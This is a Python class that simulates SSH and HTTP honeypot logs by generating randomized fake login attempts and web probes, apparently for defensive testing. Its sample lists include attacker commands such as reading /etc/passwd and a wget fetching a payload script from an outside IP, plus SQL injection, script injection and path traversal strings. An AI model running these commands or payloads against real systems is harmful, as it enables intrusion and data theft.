import asyncio, random
from datetime import datetime

class HoneypotSimulator:
    """
    Simulates SSH/HTTP honeypot logs.
    In production: deploy real listeners on isolated VMs.
    """
    FAKE_SSH_USERNAMES = ["admin","root","ubuntu","pi","user","test","oracle","postgres"]
    FAKE_PASSWORDS = ["123456","password","admin","root","toor","pass","qwerty","letmein"]
    FAKE_COMMANDS = ["whoami","id","uname -a","cat /etc/passwd","ls /","ps aux","netstat -an","wget http://185.220.101.1/payload.sh"]
    
    def generate_ssh_attempt(self) -> dict:
        return {
            "honeypot_type": "SSH",
            "timestamp": datetime.utcnow().isoformat(),
            "src_ip": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "username": random.choice(self.FAKE_SSH_USERNAMES),
            "password": random.choice(self.FAKE_PASSWORDS),
            "success": False,
            "session_id": f"sess_{random.randint(100000,999999)}",
            "commands_run": random.sample(self.FAKE_COMMANDS, random.randint(0, 3)),
        }
    
    def generate_http_probe(self) -> dict:
        paths = ["/wp-admin","/admin","/phpmyadmin","/.env","/.git/config","/api/v1/users","/login","/actuator/env"]
        return {
            "honeypot_type": "HTTP",
            "timestamp": datetime.utcnow().isoformat(),
            "src_ip": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            "method": random.choice(["GET","POST","PUT"]),
            "path": random.choice(paths),
            "user_agent": random.choice(["sqlmap/1.7","Nikto/2.1.6","python-requests/2.31","curl/7.88",]),
            "payload": random.choice([None, "' OR 1=1--", "<script>alert(1)</script>", "../../../../etc/passwd"]),
        }

honeypot = HoneypotSimulator()